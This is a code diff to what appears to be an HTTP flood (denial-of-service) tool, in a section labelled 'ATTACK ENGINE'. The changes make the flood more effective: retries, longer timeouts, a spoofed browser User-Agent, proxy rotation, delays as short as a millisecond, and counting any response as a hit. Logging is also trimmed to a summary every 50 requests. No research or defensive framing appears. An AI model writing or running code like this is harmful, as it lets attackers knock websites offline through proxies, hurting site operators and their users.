@@ -191,17 +191,28 @@ for(let i=0;i<20;i++){let s=document.createElement('div');s.className='snow';s.i
 # ============================================
 # ATTACK ENGINE
 # ============================================
-def send_req(url, proxy):
-    try:
-        p = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
-        r = requests.get(url, proxies=p, timeout=5, headers={"User-Agent":"Mozilla/5.0"})
-        return r.status_code == 200
-    except:
-        return False
+ def send_req(url, proxy):
+    """✅ FIXED: Longer timeout + Retry"""
+    for attempt in range(2):  # 2 tries per request
+        try:
+            p = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
+            r = requests.get(url, proxies=p, timeout=15, headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "*/*"
+            })
+            return True  # Any response = success
+        except:
+            if attempt == 0:
+                time.sleep(0.1)  # Small delay before retry
+            continue
+    return False
 
 def attack_thread(attack_id, url, count, speed, thread_id):
-    speeds = {"slow": 0.5, "fast": 0.05, "veryfast": 0.01, "ultra": 0.001}
+    speeds = {"slow": 0.3, "fast": 0.05, "veryfast": 0.01, "ultra": 0.001}
     delay = speeds.get(speed, 0.05)
+    
+    local_success = 0
+    local_failed = 0
     
     for i in range(count):
         if attack_id not in active_attacks:
@@ -212,11 +223,16 @@ def attack_thread(attack_id, url, count, speed, thread_id):
         
         if success:
             attack_stats["success"] += 1
+            local_success += 1
         else:
             attack_stats["failed"] += 1
+            local_failed += 1
         attack_stats["total"] += 1
         
-        attack_logs.append(f"[T{thread_id}] {'✅' if success else '❌'} {proxy} ({attack_stats['total']})")
+        # Log every 50 requests (reduce spam)
+        if (local_success + local_failed) % 50 == 0:
+            attack_logs.append(f"[T{thread_id}] ✅{local_success} ❌{local_failed} | Total: {attack_stats['total']}")
+        
         if len(attack_logs) > 200:
             attack_logs.pop(0)
         
